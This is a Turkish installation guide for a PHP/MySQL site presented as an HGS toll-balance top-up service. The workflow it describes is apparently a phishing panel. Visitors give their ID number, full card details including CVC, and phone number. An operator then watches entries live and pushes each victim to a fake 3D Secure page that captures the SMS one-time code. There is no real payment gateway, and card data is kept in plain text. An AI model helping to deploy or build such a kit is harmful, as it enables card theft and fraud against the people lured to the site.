# HGS Bakiye Yükleme Sistemi - Kurulum Talimatları

## Gereksinimler

- PHP 7.4 veya üzeri
- MySQL 5.7 veya üzeri
- Apache/Nginx web sunucusu
- XAMPP, WAMP veya benzeri (yerel geliştirme için)

## Adım Adım Kurulum

### 1. Dosyaları Kopyalayın

Tüm proje dosyalarını web sunucunuzun root dizinine kopyalayın:
- XAMPP: `C:\xampp\htdocs\hgs\`
- WAMP: `C:\wamp\www\hgs\`
- Linux: `/var/www/html/hgs/`

### 2. Veritabanını Oluşturun

#### Yöntem 1: MySQL Komut Satırı
```bash
mysql -u root -p
```

Ardından:
```sql
source database.sql
```

#### Yöntem 2: phpMyAdmin
1. Tarayıcıda `http://localhost/phpmyadmin` açın
2. Sol menüden "Yeni" (New) tıklayın
3. Veritabanı adı: `hgs_system`
4. Karakter seti: `utf8mb4_unicode_ci`
5. "Oluştur" (Create) tıklayın
6. "İçe Aktar" (Import) sekmesine gidin
7. `database.sql` dosyasını seçin
8. "Git" (Go) tıklayın

### 3. Veritabanı Bağlantı Ayarları

Aşağıdaki dosyalarda veritabanı bağlantı bilgilerini düzenleyin:

#### application-moderate.php
```php
$host = 'localhost';
$dbname = 'hgs_system';
$username = 'root';
$password = ''; // MySQL şifrenizi girin
```

#### admin.php
```php
$host = 'localhost';
$dbname = 'hgs_system';
$username = 'root';
$password = ''; // MySQL şifrenizi girin
```

#### admin_actions.php
```php
$host = 'localhost';
$dbname = 'hgs_system';
$username = 'root';
$password = ''; // MySQL şifrenizi girin
```

#### process_3d.php
```php
$host = 'localhost';
$dbname = 'hgs_system';
$username = 'root';
$password = ''; // MySQL şifrenizi girin
```

#### success.php
```php
$host = 'localhost';
$dbname = 'hgs_system';
$username = 'root';
$password = ''; // MySQL şifrenizi girin
```

### 4. Bağlantıyı Test Edin

Tarayıcıda şu adresi açın:
```
http://localhost/hgs/test_connection.php
```

Başarılı bağlantı mesajı görmelisiniz. Eğer hata alırsanız:
- MySQL servisinin çalıştığından emin olun
- Veritabanı adının doğru olduğunu kontrol edin
- Kullanıcı adı ve şifrenin doğru olduğunu kontrol edin

### 5. Admin Şifresini Değiştirin (Önerilen)

`admin.php` dosyasını açın ve şu satırı bulun:
```php
$admin_password = 'admin123';
```

Güvenli bir şifre ile değiştirin:
```php
$admin_password = 'YeniGüvenliŞifreniz123!';
```

### 6. Uygulamayı Başlatın

#### Kullanıcı Tarafı
```
http://localhost/hgs/index.php
```

#### Admin Paneli
```
http://localhost/hgs/admin.php
```
- Şifre: `admin123` (veya değiştirdiyseniz yeni şifreniz)

## Test Senaryosu

### 1. Kullanıcı İşlemi
1. `index.php` açın
2. TC Kimlik sekmesinde bir numara girin (örn: 12345678901)
3. "Sorgula" tıklayın
4. Miktar seçin (örn: 100 TL)
5. "Devam" tıklayın
6. Kart bilgilerini girin:
   - Ad Soyad: Test Kullanıcı
   - Kart No: 4111111111111111 (test kartı)
   - Son Kullanma: 12 / 25
   - CVC: 123
   - Telefon: 5551234567
7. Onay kutusunu işaretleyin
8. "Ödeme Yap" tıklayın
9. Bekle sayfasına yönlendirileceksiniz

### 2. Admin İşlemi
1. Yeni bir sekmede `admin.php` açın
2. Şifre girin: `admin123`
3. Bekleyen ödemeyi göreceksiniz
4. "3D Gönder" butonuna tıklayın
5. URL'i olduğu gibi bırakın veya özelleştirin: `3dredirect.php?token=test123`
6. "Gönder" tıklayın

### 3. 3D Secure İşlemi
1. Kullanıcı sekmesine dönün
2. Otomatik olarak 3D sayfasına yönlendirileceksiniz
3. 6 haneli bir kod girin (örn: 123456)
4. "Ödemeyi Tamamla" tıklayın
5. Başarı sayfasına yönlendirileceksiniz

### 4. Admin Kontrolü
1. Admin paneline dönün
2. Ödeme durumunun "completed" olduğunu göreceksiniz

## Dosya Yapısı

```
hgs/
├── index.php                    # Ana sayfa (kimlik sorgulama)
├── screen2.php                  # Miktar seçimi
├── screen3.php                  # Ödeme bilgileri
├── bekle.php                    # Bekleme sayfası
├── 3dredirect.php              # 3D Secure sayfası
├── process_3d.php              # 3D işlem tamamlama
├── success.php                  # Başarı sayfası
├── admin.php                    # Admin paneli
├── admin_actions.php           # Admin API
├── application-moderate.php    # Kullanıcı API
├── database.sql                # Veritabanı yapısı
├── test_connection.php         # Bağlantı testi
├── README.md                   # Proje dokümantasyonu
├── KURULUM.md                  # Bu dosya
├── background.jpg              # Arka plan görseli
└── logo.png                    # Logo görseli

```

## Sorun Giderme

### "Veritabanı bağlantı hatası"
- MySQL servisinin çalıştığından emin olun
- Bağlantı bilgilerini kontrol edin
- `database.sql` dosyasının çalıştırıldığından emin olun

### "Session bulunamadı"
- PHP session'larının etkin olduğundan emin olun
- `php.ini` dosyasında `session.save_path` ayarını kontrol edin

### "Tablolar bulunamadı"
- `database.sql` dosyasını tekrar çalıştırın
- phpMyAdmin'de tabloların oluştuğunu kontrol edin

### Admin paneline giriş yapamıyorum
- Şifrenin doğru olduğundan emin olun (varsayılan: `admin123`)
- Tarayıcı çerezlerini temizleyin
- Farklı bir tarayıcı deneyin

## Güvenlik Önerileri

⚠️ **ÖNEMLİ:** Bu sistem test amaçlıdır. Canlı ortamda kullanmadan önce:

1. **Admin şifresini değiştirin**
2. **SSL/TLS sertifikası kullanın** (HTTPS)
3. **Kart bilgilerini şifreleyin** (asla düz metin saklamayın)
4. **SQL injection koruması** ekleyin
5. **XSS koruması** ekleyin
6. **CSRF token'ları** kullanın
7. **Rate limiting** ekleyin
8. **Loglama sistemi** kurun
9. **Gerçek ödeme gateway'i** entegre edin
10. **PCI DSS standartlarına** uyun

## Destek

Sorun yaşarsanız:
1. `test_connection.php` ile bağlantıyı test edin
2. PHP hata loglarını kontrol edin
3. Tarayıcı konsolunu kontrol edin (F12)
4. MySQL loglarını kontrol edin

## Lisans

Bu proje test ve eğitim amaçlı geliştirilmiştir.
